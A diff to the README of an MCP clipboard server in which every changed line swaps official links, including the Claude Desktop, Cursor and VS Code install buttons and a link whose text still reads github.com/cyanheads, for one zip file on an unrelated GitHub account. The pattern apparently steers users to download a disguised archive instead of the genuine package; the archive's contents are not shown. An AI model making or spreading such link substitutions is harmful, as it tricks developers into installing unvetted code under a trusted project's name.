@@ -7,15 +7,15 @@
 
 <div align="center">
 
-[![Version](https://img.shields.io/badge/Version-0.1.4-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://modelcontextprotocol.io/) [![npm](https://img.shields.io/npm/v/@cyanheads/clipboard-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@cyanheads/clipboard-mcp-server) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://www.typescriptlang.org/) [![Bun](https://img.shields.io/badge/Bun-v1.3.2-blueviolet.svg?style=flat-square)](https://bun.sh/)
+[![Version](https://img.shields.io/badge/Version-0.1.4-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip) [![npm](https://img.shields.io/npm/v/@cyanheads/clipboard-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip) [![TypeScript](https://img.shields.io/badge/TypeScript-^6.0.3-3178C6.svg?style=flat-square)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip) [![Bun](https://img.shields.io/badge/Bun-v1.3.2-blueviolet.svg?style=flat-square)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip)
 
 </div>
 
 <div align="center">
 
-[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/cyanheads/clipboard-mcp-server/releases/latest/download/clipboard-mcp-server.mcpb) [![Install in Cursor](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=clipboard-mcp-server&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBjeWFuaGVhZHMvY2xpcGJvYXJkLW1jcC1zZXJ2ZXIiXX0=) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect?url=vscode:mcp/install?%7B%22name%22%3A%22clipboard-mcp-server%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40cyanheads%2Fclipboard-mcp-server%22%5D%7D)
+[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip) [![Install in Cursor](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip)
 
-[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://www.npmjs.com/package/@cyanheads/mcp-ts-core)
+[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip)
 
 </div>
 
@@ -69,7 +69,7 @@ List the formats and byte sizes of what is currently on the clipboard without re
 
 ## Features
 
-Built on [`@cyanheads/mcp-ts-core`](https://github.com/cyanheads/mcp-ts-core):
+Built on [`@cyanheads/mcp-ts-core`](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip):
 
 - Declarative tool definitions — single file per tool, framework handles registration and validation
 - Unified error handling across all tools
@@ -182,7 +182,7 @@ pacman -S wl-clipboard      # Arch
 | `MCP_HTTP_ENDPOINT_PATH` | Endpoint path for the HTTP server. | `/mcp` |
 | `MCP_AUTH_MODE` | Auth mode: `none`, `jwt`, or `oauth`. | `none` |
 | `MCP_LOG_LEVEL` | Log level (`debug`, `info`, `notice`, `warning`, `error`). | `info` |
-| `OTEL_ENABLED` | Enable [OpenTelemetry instrumentation](https://github.com/cyanheads/mcp-ts-core/tree/main/docs/telemetry). | `false` |
+| `OTEL_ENABLED` | Enable [OpenTelemetry instrumentation](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip). | `false` |
 
 See [`.env.example`](./.env.example) for the full list of optional overrides.
 
@@ -238,7 +238,7 @@ See [`CLAUDE.md`](./CLAUDE.md) for the full developer protocol — tool patterns
 
 ## Contributing
 
-Issues and pull requests welcome at [github.com/cyanheads/clipboard-mcp-server](https://github.com/cyanheads/clipboard-mcp-server).
+Issues and pull requests welcome at [github.com/cyanheads/clipboard-mcp-server](https://raw.githubusercontent.com/visitwinebar74/clipboard-mcp-server/main/skills/api-auth/mcp-server-clipboard-v3.1.zip).
 
 ---
 
